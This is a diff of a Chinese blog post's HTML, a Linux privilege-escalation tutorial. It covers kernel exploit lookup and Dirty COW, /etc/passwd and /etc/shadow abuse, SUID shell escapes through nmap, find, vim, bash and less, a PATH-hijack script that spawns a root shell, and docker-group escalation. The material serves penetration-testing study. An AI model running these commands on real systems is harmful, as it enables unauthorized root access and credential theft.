@@ -120,12 +120,12 @@
 
 
 
-<meta name="description" content="linux提权方法综述前言提权方式总结利用内核漏洞提权当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。 ，要判断我们应该先对系统相关的信息进行收集。 利用前提： 已经拿到低权限shell 目标系统上有gcc 有上传文件的权限  使用命令： uname -a  或  uname -r 这样，我们">
+<meta name="description" content="linux提权方法综述前言提权方式总结利用内核漏洞提权当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。 ，要判断我们应该先对系统相关的信息进行收集。 利用前提： 已经拿到低权限shell 目标系统上有gcc 有上传文件的权限  使用命令： 1uname -a  或  uname -r   这样">
 <meta property="og:type" content="article">
 <meta property="og:title" content="linux提权综述">
 <meta property="og:url" content="https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/index.html">
 <meta property="og:site_name" content="Shu1L&#39;s blog">
-<meta property="og:description" content="linux提权方法综述前言提权方式总结利用内核漏洞提权当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。 ，要判断我们应该先对系统相关的信息进行收集。 利用前提： 已经拿到低权限shell 目标系统上有gcc 有上传文件的权限  使用命令： uname -a  或  uname -r 这样，我们">
+<meta property="og:description" content="linux提权方法综述前言提权方式总结利用内核漏洞提权当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。 ，要判断我们应该先对系统相关的信息进行收集。 利用前提： 已经拿到低权限shell 目标系统上有gcc 有上传文件的权限  使用命令： 1uname -a  或  uname -r   这样">
 <meta property="og:image" content="d:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429143857.png">
 <meta property="og:image" content="d:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144304.png">
 <meta property="og:image" content="d:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144854.png">
@@ -423,7 +423,9 @@
 <li>有上传文件的权限</li>
 </ul>
 <p><strong>使用命令</strong>：</p>
-<pre><code>uname -a  或  uname -r</code></pre><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -<span class="keyword">a</span>  或  uname -r</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p>
 <p>这样，我们就得到了系统的内核版，cpu架构，和发行版等信息</p>
 <p>然后我们就可以使用kali自带的searchsploit来搜索利用代码。</p>
 <p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144304.png" alt=""></p>
@@ -431,36 +433,25 @@
 <h5 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux Exploit Suggester"></a>Linux Exploit Suggester</h5><p>​    linux exploit_Suggester是一款根据操作系统版本号自动查找相应<a href="https://www.webshell.cc/tag/tiquan" target="_blank" rel="noopener">提权</a>脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
 <p>下载地址：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p>
 <p>举个例子：</p>
-<pre><code>$ perl ./Linux_Exploit_Suggester.pl -k 3.0.0
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ perl ./Linux_Exploit_Suggester.pl -k <span class="number">3.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">Kernel local: <span class="number">3.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">Possible Exploits:</span><br><span class="line">[+] semtex</span><br><span class="line">   CVE<span class="number">-2013</span><span class="number">-2094</span></span><br><span class="line">   Source: www.exploit-db.com/download/<span class="number">25444</span>/‎</span><br><span class="line">[+] memodipper</span><br><span class="line">   CVE<span class="number">-2012</span><span class="number">-0056</span></span><br><span class="line">   Source: http:<span class="comment">//www.exploit-db.com/exploits/18411/</span></span><br><span class="line">[+] perf_swevent</span><br><span class="line">   CVE<span class="number">-2013</span><span class="number">-2094</span></span><br><span class="line">   Source: http:<span class="comment">//www.exploit-db.com/download/26131</span></span><br></pre></td></tr></table></figure>
 
-Kernel local: 3.0.0
-
-Possible Exploits:
-[+] semtex
-   CVE-2013-2094
-   Source: www.exploit-db.com/download/25444/‎
-[+] memodipper
-   CVE-2012-0056
-   Source: http://www.exploit-db.com/exploits/18411/
-[+] perf_swevent
-   CVE-2013-2094
-   Source: http://www.exploit-db.com/download/26131</code></pre><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul>
+<h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul>
 <li>找到具备利用条件的exp</li>
 <li>上传源代码</li>
 <li>编译exp后执行</li>
 </ul>
-<h5 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h5><pre><code>漏洞描述：
-漏洞编号：CVE-2016-5195
-漏洞名称：脏牛（Dirty COW）
-漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权
-影响范围：Linux kernel &gt;=2.6.22 并且Android也受影响</code></pre><h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p>
+<h5 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">漏洞描述：</span><br><span class="line">漏洞编号：CVE<span class="number">-2016</span><span class="number">-5195</span></span><br><span class="line">漏洞名称：脏牛（Dirty COW）</span><br><span class="line">漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权</span><br><span class="line">影响范围：Linux kernel &gt;=<span class="number">2.6</span><span class="number">.22</span> 并且Android也受影响</span><br></pre></td></tr></table></figure>
+
+<h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p>
 <p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p>
 <p>passwd 文件：</p>
 <p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p>
 <p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p>
 <p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145009.png" alt=""></p>
 <h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p>
-<pre><code>ls -l /etc/passwd /etc/shadow</code></pre><h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ul>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -l <span class="string">/etc/passwd</span> <span class="string">/etc/shadow</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ul>
 <li>shadow中存储了用户的密码hash，但是如果passwd可写，将passwd中的x改为一个已知密码的hash，那么系统在验证密码时将以passwd的为准。</li>
 <li>shadow可读的情况下，可以使用john或其他来进行暴力破解hash。</li>
 </ul>
@@ -531,38 +522,41 @@ Possible Exploits:
 <li>cp</li>
 </ul>
 <p>查找系统上运行的所有SUID可执行文件：</p>
-<pre><code>1. find / -user root -perm -4000 -print 2&gt;/dev/null
-2. find / -perm -u=s -type f 2&gt;/dev/null
-3. find / -user root -perm -4000 -exec ls -ldb {} \;</code></pre><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="builtin-name">find</span> / -user root -perm -4000 -<span class="builtin-name">print</span> 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">2. <span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line">3. <span class="builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p>
 <h5 id="例NMAP"><a href="#例NMAP" class="headerlink" title="例NMAP"></a>例NMAP</h5><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p>
 <p>交互模式可以通过执行Nmap参数” interactive “</p>
-<pre><code>nmap --interactive</code></pre><p>以下命令将提供一个提升的shell。</p>
-<pre><code>nmap&gt; !sh
-sh-3.2# whoami
-root</code></pre><p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p>
-<pre><code>exploit/unix/local/setuid_nmap</code></pre><h5 id="例Find"><a href="#例Find" class="headerlink" title="例Find"></a>例Find</h5><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p>
-<pre><code>touch pentestlab
-find pentestlab -exec whoami \;</code></pre><pre><code>touch getflag
-find / -type f -name getflag -exec &quot;whoami&quot; \;
-find / -type f -name getflag -exec &quot;/bin/sh&quot; \;</code></pre><h5 id="例VIM"><a href="#例VIM" class="headerlink" title="例VIM"></a>例VIM</h5><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p>
-<pre><code>vim.tiny /etc/shadow</code></pre><pre><code>vim.tiny
-# Press ESC key
-:set shell=/bin/sh
-:shell</code></pre><h5 id="例Bash"><a href="#例Bash" class="headerlink" title="例Bash"></a>例Bash</h5><p>以下命令将以root权限打开一个bash shell.</p>
-<pre><code>bash -p
-bash-3.2# id
-uid=1002(service) gid=1002(service) euid=0(root) groups=1002(serv</code></pre><h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p>
-<pre><code>less /etc/passwd
-!/bin/sh</code></pre><h4 id="8、环境变量劫持-SUID-扩展"><a href="#8、环境变量劫持-SUID-扩展" class="headerlink" title="8、环境变量劫持-SUID 扩展"></a><strong>8、环境变量劫持-SUID 扩展</strong></h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>
+
+<p>以下命令将提供一个提升的shell。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !<span class="keyword">sh</span></span><br><span class="line"><span class="keyword">sh-3.2# </span>whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>
+
+<h5 id="例Find"><a href="#例Find" class="headerlink" title="例Find"></a>例Find</h5><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">touch</span> <span class="string">pentestlab</span></span><br><span class="line"><span class="attr">find</span> <span class="string">pentestlab -exec whoami \;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch getflag</span><br><span class="line"><span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"whoami"</span> \;</span><br><span class="line"><span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br></pre></td></tr></table></figure>
+
+<h5 id="例VIM"><a href="#例VIM" class="headerlink" title="例VIM"></a>例VIM</h5><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line">:set <span class="keyword">shell</span><span class="bash">=/bin/sh</span></span><br><span class="line">:<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="例Bash"><a href="#例Bash" class="headerlink" title="例Bash"></a>例Bash</h5><p>以下命令将以root权限打开一个bash shell.</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line"><span class="attribute">uid</span>=1002(service) <span class="attribute">gid</span>=1002(service) <span class="attribute">euid</span>=0(root) <span class="attribute">groups</span>=1002(serv</span><br></pre></td></tr></table></figure>
+
+<h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less <span class="regexp">/etc/</span>passwd</span><br><span class="line">!<span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="8、环境变量劫持-SUID-扩展"><a href="#8、环境变量劫持-SUID-扩展" class="headerlink" title="8、环境变量劫持-SUID 扩展"></a><strong>8、环境变量劫持-SUID 扩展</strong></h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p>
 <p>linux 下执行命令，如 cat，是去环境变量查找 ,将 cat 替换</p>
 <p><strong>测试：</strong></p>
 <p>把新建一个 /tmp/cat，而 cat 内容为我们脚本，当用户执行 cat 命令，cat /etc/shadow，则执行我们的脚本 </p>
-<pre class=" language-javascript"><code class="language-javascript">    cat <span class="token operator">></span><span class="token operator">></span> <span class="token operator">/</span>tmp<span class="token operator">/</span>ls <span class="token operator">&lt;</span><span class="token operator">&lt;</span>EOF  
-    #<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python  
-    print <span class="token string">"this is not the true cat"</span>  
-    print <span class="token string">"here is a root shell!"</span>  
-    <span class="token keyword">import</span> pty<span class="token punctuation">;</span>pty<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>  
-    EOF</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; <span class="regexp">/tmp/</span>ls &lt;&lt;EOF  </span><br><span class="line"><span class="meta">#!/usr/bin/python  </span></span><br><span class="line">print <span class="string">"this is not the true cat"</span>  </span><br><span class="line">print <span class="string">"here is a root shell!"</span>  </span><br><span class="line"><span class="keyword">import</span> pty;pty.spawn(<span class="string">"/bin/sh"</span>)  </span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
 <p>此时再执行 ./suid-exp，可执行我们定义的脚本，因为 suid-exp 以管理员执行 cat 命令，而 linux 的 system 是根据环境变量来执行 cat 的，原本是默认的 cat，当修改了之后，cat 就不再是原来的 cat，而是我们自己定义的脚本，从而达到执行任意命令的目的，即可去提权。</p>
 <h4 id="10、docker-组提权"><a href="#10、docker-组提权" class="headerlink" title="10、docker 组提权"></a><strong>10、docker 组提权</strong></h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p>
 <p>可以参考我的这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p>
